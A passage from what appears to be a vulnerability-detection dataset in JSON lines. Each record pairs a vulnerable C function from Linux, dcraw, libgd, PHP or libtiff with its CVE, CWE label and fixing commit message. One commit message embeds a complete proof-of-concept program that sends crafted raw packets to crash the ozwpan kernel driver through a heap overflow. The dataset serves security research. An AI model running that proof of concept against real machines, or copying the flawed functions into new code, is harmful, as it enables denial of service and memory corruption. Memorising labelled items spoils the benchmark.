else\n\t\t\tgoto out;\n\t}\n\tret = 0;\nout:\n\tbrelse(bh);\n\treturn ret;\n}\n", "func_hash": 154377499296836303513685824320662860107, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-4167", "cve_desc": "The udf_read_inode function in fs/udf/inode.c in the Linux kernel before 3.19.1 does not validate certain length values, which allows local users to cause a denial of service (incorrect data representation or integer overflow, and OOPS) via a crafted UDF filesystem.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-4167"}
{"idx": 1474, "project": "linux", "commit_id": "b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c", "commit_message": "ozwpan: Use unsigned ints to prevent heap overflow\n\nUsing signed integers, the subtraction between required_size and offset\ncould wind up being negative, resulting in a memcpy into a heap buffer\nwith a negative length, resulting in huge amounts of network-supplied\ndata being copied into the heap, which could potentially lead to remote\ncode execution.. This is remotely triggerable with a magic packet.\nA PoC which obtains DoS follows below. It requires the ozprotocol.h file\nfrom this module.\n\n=-=-=-=-=-=\n\n #include <arpa/inet.h>\n #include <linux/if_packet.h>\n #include <net/if.h>\n #include <netinet/ether.h>\n #include <stdio.h>\n #include <string.h>\n #include <stdlib.h>\n #include <endian.h>\n #include <sys/ioctl.h>\n #include <sys/socket.h>\n\n #define u8 uint8_t\n #define u16 uint16_t\n #define u32 uint32_t\n #define __packed __attribute__((__packed__))\n #include \"ozprotocol.h\"\n\nstatic int hex2num(char c)\n{\n\tif (c >= '0' && c <= '9')\n\t\treturn c - '0';\n\tif (c >= 'a' && c <= 'f')\n\t\treturn c - 'a' + 10;\n\tif (c >= 'A' && c <= 'F')\n\t\treturn c - 'A' + 10;\n\treturn -1;\n}\nstatic int hwaddr_aton(const char *txt, uint8_t *addr)\n{\n\tint i;\n\tfor (i = 0; i < 6; i++) {\n\t\tint a, b;\n\t\ta = hex2num(*txt++);\n\t\tif (a < 0)\n\t\t\treturn -1;\n\t\tb = hex2num(*txt++);\n\t\tif (b < 0)\n\t\t\treturn -1;\n\t\t*addr++ = (a << 4) | b;\n\t\tif (i < 5 && *txt++ != ':')\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\nint main(int argc, char *argv[])\n{\n\tif (argc < 3) {\n\t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);\n\t\treturn 1;\n\t}\n\n\tuint8_t dest_mac[6];\n\tif (hwaddr_aton(argv[2], dest_mac)) {\n\t\tfprintf(stderr, \"Invalid mac address.\\n\");\n\t\treturn 1;\n\t}\n\n\tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);\n\tif (sockfd < 0) {\n\t\tperror(\"socket\");\n\t\treturn 1;\n\t}\n\n\tstruct ifreq if_idx;\n\tint interface_index;\n\tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);\n\tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFINDEX\");\n\t\treturn 1;\n\t}\n\tinterface_index = if_idx.ifr_ifindex;\n\tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFHWADDR\");\n\t\treturn 1;\n\t}\n\tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_elt_connect_req oz_elt_connect_req;\n\t} __packed connect_packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(0)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_CONNECT_REQ,\n\t\t\t.length = sizeof(struct oz_elt_connect_req)\n\t\t},\n\t\t.oz_elt_connect_req = {\n\t\t\t.mode = 0,\n\t\t\t.resv1 = {0},\n\t\t\t.pd_info = 0,\n\t\t\t.session_id = 0,\n\t\t\t.presleep = 35,\n\t\t\t.ms_isoc_latency = 0,\n\t\t\t.host_vendor = 0,\n\t\t\t.keep_alive = 0,\n\t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1),\n\t\t\t.max_len_div16 = 0,\n\t\t\t.ms_per_isoc = 0,\n\t\t\t.up_audio_buf = 0,\n\t\t\t.ms_per_elt = 0\n\t\t}\n\t};\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_get_desc_rsp oz_get_desc_rsp;\n\t} __packed pwn_packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(1)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_APP_DATA,\n\t\t\t.length = sizeof(struct oz_get_desc_rsp)\n\t\t},\n\t\t.oz_get_desc_rsp = {\n\t\t\t.app_id = OZ_APPID_USB,\n\t\t\t.elt_seq_num = 0,\n\t\t\t.type = OZ_GET_DESC_RSP,\n\t\t\t.req_id = 0,\n\t\t\t.offset = htole16(2),\n\t\t\t.total_size = htole16(1),\n\t\t\t.rcode = 0,\n\t\t\t.data = {0}\n\t\t}\n\t};\n\n\tstruct sockaddr_ll socket_address = {\n\t\t.sll_ifindex = interface_index,\n\t\t.sll_halen = ETH_ALEN,\n\t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t};\n\n\tif (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\tusleep(300000);\n\tif (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com>\nAcked-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>", "target": 1, "func": "void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,\n\t\t\tint length, int offset, int total_size)\n {\n \tstruct oz_port *port = hport;\n \tstruct urb *urb;\n\tint err = 0;\n\n\toz_dbg(ON, \"oz_hcd_get_desc_cnf length = %d offs = %d tot_size = %d\\n\",\n\t       length, offset, total_size);\n\turb = oz_find_urb_by_id(port, 0, req_id);\n \tif (!urb)\n \t\treturn;\n \tif (status == 0) {\n\t\tint copy_len;\n\t\tint required_size = urb->transfer_buffer_length;\n \n \t\tif (required_size > total_size)\n \t\t\trequired_size = total_size;\n\t\tcopy_len = required_size-offset;\n\t\tif (length <= copy_len)\n\t\t\tcopy_len = length;\n\t\tmemcpy(urb->transfer_buffer+offset, desc, copy_len);\n\t\toffset += copy_len;\n\t\tif (offset < required_size) {\n\t\t\tstruct usb_ctrlrequest *setup =\n\t\t\t\t(struct usb_ctrlrequest *)urb->setup_packet;\n\t\t\tunsigned wvalue = le16_to_cpu(setup->wValue);\n\n\t\t\tif (oz_enqueue_ep_urb(port, 0, 0, urb, req_id))\n\t\t\t\terr = -ENOMEM;\n\t\t\telse if (oz_usb_get_desc_req(port->hpd, req_id,\n\t\t\t\t\tsetup->bRequestType, (u8)(wvalue>>8),\n\t\t\t\t\t(u8)wvalue, setup->wIndex, offset,\n\t\t\t\t\trequired_size-offset)) {\n\t\t\t\toz_dequeue_ep_urb(port, 0, 0, urb);\n\t\t\t\terr = -ENOMEM;\n\t\t\t}\n\t\t\tif (err == 0)\n\t\t\t\treturn;\n\t\t}\n\t}\n\turb->actual_length = total_size;\n\toz_complete_urb(port->ozhcd->hcd, urb, 0);\n}\n", "func_hash": 320708195163871116363817901150537816688, "file_name": "ozhcd.c", "file_hash": 306747271140156941253228819715895305567, "cwe": ["CWE-189"], "cve": "CVE-2015-4001", "cve_desc": "Integer signedness error in the oz_hcd_get_desc_cnf function in drivers/staging/ozwpan/ozhcd.c in the OZWPAN driver in the Linux kernel through 4.0.5 allows remote attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-4001"}
{"idx": 1477, "project": "rawstudio", "commit_id": "983bda1f0fa5fa86884381208274198a620f006e", "project_url": "https://github.com/rawstudio/rawstudio", "commit_url": "https://github.com/rawstudio/rawstudio/commit/983bda1f0fa5fa86884381208274198a620f006e", "commit_message": "Avoid overflow in ljpeg_start().", "target": 1, "func": " int CLASS ljpeg_start (struct jhead *jh, int info_only)\n {\n  int c, tag, len;\n   uchar data[0x10000];\n   const uchar *dp;\n \n  memset (jh, 0, sizeof *jh);\n  jh->restart = INT_MAX;\n  fread (data, 2, 1, ifp);\n  if (data[1] != 0xd8) return 0;\n  do {\n    fread (data, 2, 2, ifp);\n    tag =  data[0] << 8 | data[1];\n    len = (data[2] << 8 | data[3]) - 2;\n    if (tag <= 0xff00) return 0;\n    fread (data, 1, len, ifp);\n    switch (tag) {\n      case 0xffc3:\n\tjh->sraw = ((data[7] >> 4) * (data[7] & 15) - 1) & 3;\n      case 0xffc0:\n\tjh->bits = data[0];\n\tjh->high = data[1] << 8 | data[2];\n\tjh->wide = data[3] << 8 | data[4];\n\tjh->clrs = data[5] + jh->sraw;\n\tif (len == 9 && !dng_version) getc(ifp);\n\tbreak;\n      case 0xffc4:\n\tif (info_only) break;\n\tfor (dp = data; dp < data+len && (c = *dp++) < 4; )\n\t  jh->free[c] = jh->huff[c] = make_decoder_ref (&dp);\n\tbreak;\n      case 0xffda:\n\tjh->psv = data[1+data[0]*2];\n\tjh->bits -= data[3+data[0]*2] & 15;\n\tbreak;\n      case 0xffdd:\n\tjh->restart = data[0] << 8 | data[1];\n    }\n  } while (tag != 0xffda);\n  if (info_only) return 1;\n  FORC(5) if (!jh->huff[c+1]) jh->huff[c+1] = jh->huff[c];\n  if (jh->sraw) {\n    FORC(4)        jh->huff[2+c] = jh->huff[1];\n    FORC(jh->sraw) jh->huff[1+c] = jh->huff[0];\n  }\n  jh->row = (ushort *) calloc (jh->wide*jh->clrs, 4);\n  merror (jh->row, \"ljpeg_start()\");\n  return zero_after_ff = 1;\n}\n", "func_hash": 291937476956930911673344322008402224120, "file_name": "dcraw.cc", "file_hash": 297550824630771478954711776272100350251, "cwe": ["CWE-189"], "cve": "CVE-2015-3885", "cve_desc": "Integer overflow in the ljpeg_start function in dcraw 7.00 and earlier allows remote attackers to cause a denial of service (crash) via a crafted image, which triggers a buffer overflow, related to the len variable.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3885"}
{"idx": 1596, "project": "linux", "commit_id": "942080643bce061c3dd9d5718d3b745dcb39a8bc", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/942080643bce061c3dd9d5718d3b745dcb39a8bc", "commit_message": "eCryptfs: Remove buggy and unnecessary write in file name decode routine\n\nDmitry Chernenkov used KASAN to discover that eCryptfs writes past the\nend of the allocated buffer during encrypted filename decoding. This\nfix corrects the issue by getting rid of the unnecessary 0 write when\nthe current bit offset is 2.\n\nSigned-off-by: Michael Halcrow <mhalcrow@google.com>\nReported-by: Dmitry Chernenkov <dmitryc@google.com>\nSuggested-by: Kees Cook <keescook@chromium.org>\nCc: stable@vger.kernel.org # v2.6.29+: 51ca58d eCryptfs: Filename Encryption: Encoding and encryption functions\nSigned-off-by: Tyler Hicks <tyhicks@canonical.com>", "target": 1, "func": "ecryptfs_decode_from_filename(unsigned char *dst, size_t *dst_size,\n\t\t\t      const unsigned char *src, size_t src_size)\n{\n\tu8 current_bit_offset = 0;\n\tsize_t src_byte_offset = 0;\n\tsize_t dst_byte_offset = 0;\n\n\tif (dst == NULL) {\n\t\t(*dst_size) = ecryptfs_max_decoded_size(src_size);\n\t\tgoto out;\n\t}\n\twhile (src_byte_offset < src_size) {\n\t\tunsigned char src_byte =\n\t\t\t\tfilename_rev_map[(int)src[src_byte_offset]];\n\n\t\tswitch (current_bit_offset) {\n\t\tcase 0:\n\t\t\tdst[dst_byte_offset] = (src_byte << 2);\n\t\t\tcurrent_bit_offset = 6;\n\t\t\tbreak;\n\t\tcase 6:\n\t\t\tdst[dst_byte_offset++] |= (src_byte >> 4);\n\t\t\tdst[dst_byte_offset] = ((src_byte & 0xF)\n\t\t\t\t\t\t << 4);\n\t\t\tcurrent_bit_offset = 4;\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tdst[dst_byte_offset++] |= (src_byte >> 2);\n\t\t\tdst[dst_byte_offset] = (src_byte << 6);\n\t\t\tcurrent_bit_offset = 2;\n \t\t\tbreak;\n \t\tcase 2:\n \t\t\tdst[dst_byte_offset++] |= (src_byte);\n\t\t\tdst[dst_byte_offset] = 0;\n \t\t\tcurrent_bit_offset = 0;\n \t\t\tbreak;\n \t\t}\n\t\tsrc_byte_offset++;\n\t}\n\t(*dst_size) = dst_byte_offset;\nout:\n\treturn;\n}\n", "func_hash": 288062041952122119374859166828939631466, "file_name": "crypto.c", "file_hash": 83043817776762883713578403833422318719, "cwe": ["CWE-189"], "cve": "CVE-2014-9683", "cve_desc": "Off-by-one error in the ecryptfs_decode_from_filename function in fs/ecryptfs/crypto.c in the eCryptfs subsystem in the Linux kernel before 3.18.2 allows local users to cause a denial of service (buffer overflow and system crash) or possibly gain privileges via a crafted filename.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9683"}
{"idx": 2116, "project": "linux", "commit_id": "d157bd761585605b7882935ffb86286919f62ea1", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/d157bd761585605b7882935ffb86286919f62ea1", "commit_message": "netfilter: x_tables: check for size overflow\n\nBen Hawkes says:\n integer overflow in xt_alloc_table_info, which on 32-bit systems can\n lead to small structure allocation and a copy_from_user based heap\n corruption.\n\nReported-by: Ben Hawkes <hawkes@google.com>\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>", "target": 1, "func": "struct xt_table_info *xt_alloc_table_info(unsigned int size)\n{\n \tstruct xt_table_info *info = NULL;\n \tsize_t sz = sizeof(*info) + size;\n \n \t/* Pedantry: prevent them from hitting BUG() in vmalloc.c --RR */\n \tif ((SMP_ALIGN(size) >> PAGE_SHIFT) + 2 > totalram_pages)\n \t\treturn NULL;\n\n\tif (sz <= (PAGE_SIZE << PAGE_ALLOC_COSTLY_ORDER))\n\t\tinfo = kmalloc(sz, GFP_KERNEL | __GFP_NOWARN | __GFP_NORETRY);\n\tif (!info) {\n\t\tinfo = vmalloc(sz);\n\t\tif (!info)\n\t\t\treturn NULL;\n\t}\n\tmemset(info, 0, sizeof(*info));\n\tinfo->size = size;\n\treturn info;\n}\n", "func_hash": 123369081460672787733071374349645301384, "file_name": "x_tables.c", "file_hash": 15814788980344082153443121316340260940, "cwe": ["CWE-189"], "cve": "CVE-2016-3135", "cve_desc": "Integer overflow in the xt_alloc_table_info function in net/netfilter/x_tables.c in the Linux kernel through 4.5.2 on 32-bit platforms allows local users to gain privileges or cause a denial of service (heap memory corruption) via an IPT_SO_SET_REPLACE setsockopt call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-3135"}
{"idx": 2134, "project": "libgd", "commit_id": "2bb97f407c1145c850416a3bfbcc8cf124e68a19", "project_url": "https://github.com/libgd/libgd", "commit_url": "https://github.com/libgd/libgd/commit/2bb97f407c1145c850416a3bfbcc8cf124e68a19", "commit_message": "gd2: handle corrupt images better (CVE-2016-3074)\n\nMake sure we do some range checking on corrupted chunks.\n\nThanks to Hans Jerry Illikainen <hji@dyntopia.com> for indepth report\nand reproducer information.  Made for easy test case writing :).", "target": 1, "func": "_gd2GetHeader (gdIOCtxPtr in, int *sx, int *sy,\n               int *cs, int *vers, int *fmt, int *ncx, int *ncy,\n               t_chunk_info ** chunkIdx)\n{\n\tint i;\n\tint ch;\n\tchar id[5];\n\tt_chunk_info *cidx;\n\tint sidx;\n\tint nc;\n\n\tGD2_DBG (printf (\"Reading gd2 header info\\n\"));\n\n\tfor (i = 0; i < 4; i++) {\n\t\tch = gdGetC (in);\n\t\tif (ch == EOF) {\n\t\t\tgoto fail1;\n\t\t};\n\t\tid[i] = ch;\n\t};\n\tid[4] = 0;\n\n\tGD2_DBG (printf (\"Got file code: %s\\n\", id));\n\n\t/* Equiv. of 'magick'.  */\n\tif (strcmp (id, GD2_ID) != 0) {\n\t\tGD2_DBG (printf (\"Not a valid gd2 file\\n\"));\n\t\tgoto fail1;\n\t};\n\n\t/* Version */\n\tif (gdGetWord (vers, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"Version: %d\\n\", *vers));\n\n\tif ((*vers != 1) && (*vers != 2)) {\n\t\tGD2_DBG (printf (\"Bad version: %d\\n\", *vers));\n\t\tgoto fail1;\n\t};\n\n\t/* Image Size */\n\tif (!gdGetWord (sx, in)) {\n\t\tGD2_DBG (printf (\"Could not get x-size\\n\"));\n\t\tgoto fail1;\n\t}\n\tif (!gdGetWord (sy, in)) {\n\t\tGD2_DBG (printf (\"Could not get y-size\\n\"));\n\t\tgoto fail1;\n\t}\n\tGD2_DBG (printf (\"Image is %dx%d\\n\", *sx, *sy));\n\n\t/* Chunk Size (pixels, not bytes!) */\n\tif (gdGetWord (cs, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"ChunkSize: %d\\n\", *cs));\n\n\tif ((*cs < GD2_CHUNKSIZE_MIN) || (*cs > GD2_CHUNKSIZE_MAX)) {\n\t\tGD2_DBG (printf (\"Bad chunk size: %d\\n\", *cs));\n\t\tgoto fail1;\n\t};\n\n\t/* Data Format */\n\tif (gdGetWord (fmt, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"Format: %d\\n\", *fmt));\n\n\tif ((*fmt != GD2_FMT_RAW) && (*fmt != GD2_FMT_COMPRESSED) &&\n\t        (*fmt != GD2_FMT_TRUECOLOR_RAW) &&\n\t        (*fmt != GD2_FMT_TRUECOLOR_COMPRESSED)) {\n\t\tGD2_DBG (printf (\"Bad data format: %d\\n\", *fmt));\n\t\tgoto fail1;\n\t};\n\n\n\t/* # of chunks wide */\n\tif (gdGetWord (ncx, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"%d Chunks Wide\\n\", *ncx));\n\n\t/* # of chunks high */\n\tif (gdGetWord (ncy, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"%d Chunks vertically\\n\", *ncy));\n\n\tif (gd2_compressed (*fmt)) {\n\t\tnc = (*ncx) * (*ncy);\n\t\tGD2_DBG (printf (\"Reading %d chunk index entries\\n\", nc));\n\t\tsidx = sizeof (t_chunk_info) * nc;\n\t\tcidx = gdCalloc (sidx, 1);\n\t\tif (!cidx) {\n\t\t\tgoto fail1;\n\t\t}\n\t\tfor (i = 0; i < nc; i++) {\n\t\t\tif (gdGetInt (&cidx[i].offset, in) != 1) {\n\t\t\t\tgoto fail2;\n\t\t\t};\n \t\t\tif (gdGetInt (&cidx[i].size, in) != 1) {\n \t\t\t\tgoto fail2;\n \t\t\t};\n \t\t};\n \t\t*chunkIdx = cidx;\n \t};\n\n\tGD2_DBG (printf (\"gd2 header complete\\n\"));\n\n\treturn 1;\nfail2:\n\tgdFree(cidx);\nfail1:\n\treturn 0;\n}\n", "func_hash": 166042292574051102268540874611334135031, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-3074", "cve_desc": "Integer signedness error in GD Graphics Library 2.1.1 (aka libgd or libgd2) allows remote attackers to cause a denial of service (crash) or potentially execute arbitrary code via crafted compressed gd2 data, which triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-3074"}
{"idx": 2186, "project": "linux", "commit_id": "8b8a321ff72c785ed5e8b4cf6eda20b35d427390", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/8b8a321ff72c785ed5e8b4cf6eda20b35d427390", "commit_message": "tcp: fix zero cwnd in tcp_cwnd_reduction\n\nPatch 3759824da87b (\"tcp: PRR uses CRB mode by default and SS mode\nconditionally\") introduced a bug that cwnd may become 0 when both\ninflight and sndcnt are 0 (cwnd = inflight + sndcnt). This may lead\nto a div-by-zero if the connection starts another cwnd reduction\nphase by setting tp->prior_cwnd to the current cwnd (0) in\ntcp_init_cwnd_reduction().\n\nTo prevent this we skip PRR operation when nothing is acked or\nsacked. Then cwnd must be positive in all cases as long as ssthresh\nis positive:\n\n1) The proportional reduction mode\n   inflight > ssthresh > 0\n\n2) The reduction bound mode\n  a) inflight == ssthresh > 0\n\n  b) inflight < ssthresh\n     sndcnt > 0 since newly_acked_sacked > 0 and inflight < ssthresh\n\nTherefore in all cases inflight and sndcnt can not both be 0.\nWe check invalid tp->prior_cwnd to avoid potential div0 bugs.\n\nIn reality this bug is triggered only with a sequence of less common\nevents.  For example, the connection is terminating an ECN-triggered\ncwnd reduction with an inflight 0, then it receives reordered/old\nACKs or DSACKs from prior transmission (which acks nothing). Or the\nconnection is in fast recovery stage that marks everything lost,\nbut fails to retransmit due to local issues, then receives data\npackets from other end which acks nothing.\n\nFixes: 3759824da87b (\"tcp: PRR uses CRB mode by default and SS mode conditionally\")\nReported-by: Oleksandr Natalenko <oleksandr@natalenko.name>\nSigned-off-by: Yuchung Cheng <ycheng@google.com>\nSigned-off-by: Neal Cardwell <ncardwell@google.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 1, "func": "static void tcp_cwnd_reduction(struct sock *sk, const int prior_unsacked,\n\t\t\t       int fast_rexmit, int flag)\n{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tint sndcnt = 0;\n\tint delta = tp->snd_ssthresh - tcp_packets_in_flight(tp);\n \tint newly_acked_sacked = prior_unsacked -\n \t\t\t\t (tp->packets_out - tp->sacked_out);\n \n \ttp->prr_delivered += newly_acked_sacked;\n \tif (delta < 0) {\n \t\tu64 dividend = (u64)tp->snd_ssthresh * tp->prr_delivered +\n\t\t\t       tp->prior_cwnd - 1;\n\t\tsndcnt = div_u64(dividend, tp->prior_cwnd) - tp->prr_out;\n\t} else if ((flag & FLAG_RETRANS_DATA_ACKED) &&\n\t\t   !(flag & FLAG_LOST_RETRANS)) {\n\t\tsndcnt = min_t(int, delta,\n\t\t\t       max_t(int, tp->prr_delivered - tp->prr_out,\n\t\t\t\t     newly_acked_sacked) + 1);\n\t} else {\n\t\tsndcnt = min(delta, newly_acked_sacked);\n\t}\n\tsndcnt = max(sndcnt, (fast_rexmit ? 1 : 0));\n\ttp->snd_cwnd = tcp_packets_in_flight(tp) + sndcnt;\n}\n", "func_hash": 136149861517984153137826377668976874297, "file_name": "tcp_input.c", "file_hash": 150702089358866051963725971042798834736, "cwe": ["CWE-189"], "cve": "CVE-2016-2070", "cve_desc": "The tcp_cwnd_reduction function in net/ipv4/tcp_input.c in the Linux kernel before 4.3.5 allows remote attackers to cause a denial of service (divide-by-zero error and system crash) via crafted TCP traffic.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2070"}
{"idx": 3105, "project": "php-src", "commit_id": "1cda0d7c2ffb62d8331c64e703131d9cabdc03ea", "project_url": "https://github.com/php/php-src", "commit_url": "https://github.com/php/php-src/commit/1cda0d7c2ffb62d8331c64e703131d9cabdc03ea", "commit_message": "Fix bug #73737 FPE when parsing a tag format", "target": 1, "func": "static size_t exif_convert_any_to_int(void *value, int format, int motorola_intel TSRMLS_DC)\n{\n\tint \t\ts_den;\n\tunsigned \tu_den;\n\n\tswitch(format) {\n\t\tcase TAG_FMT_SBYTE:     return *(signed char *)value;\n\t\tcase TAG_FMT_BYTE:      return *(uchar *)value;\n\n\t\tcase TAG_FMT_USHORT:    return php_ifd_get16u(value, motorola_intel);\n\t\tcase TAG_FMT_ULONG:     return php_ifd_get32u(value, motorola_intel);\n\n\t\tcase TAG_FMT_URATIONAL:\n\t\t\tu_den = php_ifd_get32u(4+(char *)value, motorola_intel);\n\t\t\tif (u_den == 0) {\n\t\t\t\treturn 0;\n\t\t\t} else {\n\t\t\t\treturn php_ifd_get32u(value, motorola_intel) / u_den;\n\t\t\t}\n\n\t\tcase TAG_FMT_SRATIONAL:\n\t\t\ts_den = php_ifd_get32s(4+(char *)value, motorola_intel);\n \t\t\tif (s_den == 0) {\n \t\t\t\treturn 0;\n \t\t\t} else {\n\t\t\t\treturn php_ifd_get32s(value, motorola_intel) / s_den;\n \t\t\t}\n \n \t\tcase TAG_FMT_SSHORT:    return php_ifd_get16u(value, motorola_intel);\n\t\tcase TAG_FMT_SLONG:     return php_ifd_get32s(value, motorola_intel);\n\n\t\t/* Not sure if this is correct (never seen float used in Exif format) */\n\t\tcase TAG_FMT_SINGLE:\n#ifdef EXIF_DEBUG\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_NOTICE, \"Found value of type single\");\n#endif\n\t\t\treturn (size_t)*(float *)value;\n\t\tcase TAG_FMT_DOUBLE:\n#ifdef EXIF_DEBUG\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_NOTICE, \"Found value of type double\");\n#endif\n\t\t\treturn (size_t)*(double *)value;\n\t}\n\treturn 0;\n}\n", "func_hash": 117898004511095579221735528852953634731, "file_name": "exif.c", "file_hash": 125847680861239822284460003438182574624, "cwe": ["CWE-189"], "cve": "CVE-2016-10158", "cve_desc": "The exif_convert_any_to_int function in ext/exif/exif.c in PHP before 5.6.30, 7.0.x before 7.0.15, and 7.1.x before 7.1.1 allows remote attackers to cause a denial of service (application crash) via crafted EXIF data that triggers an attempt to divide the minimum representable negative integer by -1.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-10158"}
{"idx": 3120, "project": "libtiff", "commit_id": "c7153361a4041260719b340f73f2f76", "project_url": "https://github.com/vadz/libtiff", "commit_url": "https://github.com/vadz/libtiff/commit/c7153361a4041260719b340f73f2f76", "commit_message": "* tools/tiff2pdf.c: avoid potential heap-based overflow in\nt2p_readwrite_pdf_image_tile().\nFixes http://bugzilla.maptools.org/show_bug.cgi?id=2640", "target": 1, "func": "tsize_t t2p_readwrite_pdf_image_tile(T2P* t2p, TIFF* input, TIFF* output, ttile_t tile){\n\n\tuint16 edge=0;\n\ttsize_t written=0;\n\tunsigned char* buffer=NULL;\n\ttsize_t bufferoffset=0;\n\tunsigned char* samplebuffer=NULL;\n\ttsize_t samplebufferoffset=0;\n\ttsize_t read=0;\n\tuint16 i=0;\n\tttile_t tilecount=0;\n\t/* tsize_t tilesize=0; */\n\tttile_t septilecount=0;\n\ttsize_t septilesize=0;\n#ifdef JPEG_SUPPORT\n\tunsigned char* jpt;\n\tfloat* xfloatp;\n\tuint32 xuint32=0;\n#endif\n\n\t/* Fail if prior error (in particular, can't trust tiff_datasize) */\n\tif (t2p->t2p_error != T2P_ERR_OK)\n\t\treturn(0);\n\n\tedge |= t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile);\n\tedge |= t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile);\n\n\tif( (t2p->pdf_transcode == T2P_TRANSCODE_RAW) && ((edge == 0)\n#if defined(JPEG_SUPPORT) || defined(OJPEG_SUPPORT)\n\t\t|| (t2p->pdf_compression == T2P_COMPRESS_JPEG)\n#endif\n\t)\n\t){\n#ifdef CCITT_SUPPORT\n\t\tif(t2p->pdf_compression == T2P_COMPRESS_G4){\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tTIFFReadRawTile(input, tile, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\tif (t2p->tiff_fillorder==FILLORDER_LSB2MSB){\n\t\t\t\t\tTIFFReverseBits(buffer, t2p->tiff_datasize);\n\t\t\t}\n\t\t\tt2pWriteFile(output, 